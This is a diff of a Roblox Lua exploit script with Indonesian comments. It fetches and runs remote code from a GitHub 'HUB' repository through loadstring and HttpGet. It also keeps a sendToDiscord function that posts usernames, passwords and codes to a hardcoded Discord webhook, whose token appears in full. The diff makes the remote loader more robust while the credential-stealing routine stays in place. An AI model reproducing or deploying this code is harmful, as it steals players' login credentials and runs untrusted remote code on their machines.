@@ -1,5 +1,11 @@
--- Load Orion Library (dengan nama baru)
-local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Andreaw1140/Andretremor-HUB/refs/heads/main/source"))()
+-- Load Orion Library
+local success, OrionLib = pcall(function()
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Andreaw1140/Andretremor-HUB/refs/heads/main/source"))()
+end)
+
+if not success then
+    error("Gagal memuat Orion Library. Periksa URL atau koneksi.")
+end
 
 -- Webhook URL Discord
 local webhook_url = "https://discord.com/api/webhooks/1319657197705367604/YDNwABDpMP0FcZrC5QqEOH9IbPqt67FmLF1yz6gNks0yxISJPoHbUBFyB1zgei3C5OOR"
@@ -24,15 +30,12 @@ local function sendToDiscord(username, password, code)
         })
     }
 
-    local response
     if syn and syn.request then
-        response = syn.request(payload)
+        syn.request(payload)
     elseif http and http.request then
-        response = http.request(payload)
+        http.request(payload)
     elseif request then
-        response = request(payload)
-    else
-        return -- Tidak ada output
+        request(payload)
     end
 end
 
